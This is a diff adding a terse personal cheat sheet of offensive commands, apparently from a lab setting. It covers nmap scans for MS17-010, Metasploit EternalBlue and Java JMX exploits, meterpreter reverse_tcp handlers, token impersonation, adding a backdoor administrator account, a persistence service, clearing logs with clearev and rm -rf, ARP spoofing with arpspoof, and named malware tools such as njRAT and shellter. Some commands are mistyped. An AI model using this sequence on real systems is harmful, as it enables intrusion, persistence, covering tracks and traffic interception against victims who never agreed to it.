@@ -1,0 +1,69 @@
+nmap -p445 --script smb-vuln-ms17-010 {IP of win 7}
+nmap -p 25 --script=smtp-enum-users {IP of win 7}
+3306 SQl
+mysql -h 192.168.8.203 -u root /-p password
+cut -d ":" -f 1 /etc/passwd
+mfsdb init
+msfconsole
+
+load incognito   --> help  --> list_tokens
+impersonate_token  --> impersonate_token VAGRANT-2008R2\\vagrant
+add_user dung dung1 -h <IP-victim>
+add_localgroup_user Administrators dung -h <IP-victim>
+rdesktop -u dung -p dung1 <IP-victim>
+--------------------------delete all log
+clearev           //in window   
+rm -rf messages   //in linux
+------------------------msf command
+bg    --> sessions
+search ms17-010
+
+use auxiliary/scanner/smb_ms17_010
+options  (Rhost Rport  is importance)
+
+set rhosts=<IP victim>
+run
+
+use exploit/windows/smb/smb_ms17_010
+exploit
+
+-----add malware
+use exploit/windows/local/persistence_service
+set session 1
+
+use exploit/multi/handler
+set lhost 192.168.8.101
+set payload windows/meterpreter/reverse_tcp
+run
+-------
+use exploit/multi/misc/java_jmx_server
+set rport 1617
+set rhosts 192.168.8.128
+set payload java/meterpreter/reverse_tcp
+Ese->wq!
+------------------------------------check connection
+Window-------------- 
+netstat -an | find "LISTEN"
+netstat -an | find "ESTABLISHED"
+kali----------------
+netstat -tupn | grep ESTABLISHED
+netstat -tulpn | grep LISTEN
+
+log
+
+?   #help
+net user hoan /add
+----------------------------------    malware
+JPS
+shellter
+njRaT
+---------------------------------network sniffing
+arp -a
+A B(hacker) C 
+sudo apt-get install dsniff -y
+arpspoof -i the0 -t 192.168.8.207 192.168.8.203
+arpspoof -i the0 -t 192.168.8.203 192.168.8.207  
+//Kali bảo là 207(C) là mac của 203(A) là mac của kali(B)
+https://www.youtube.com/watch?v=iI8eAVloSYs
+--------------------------------
+searchsploit
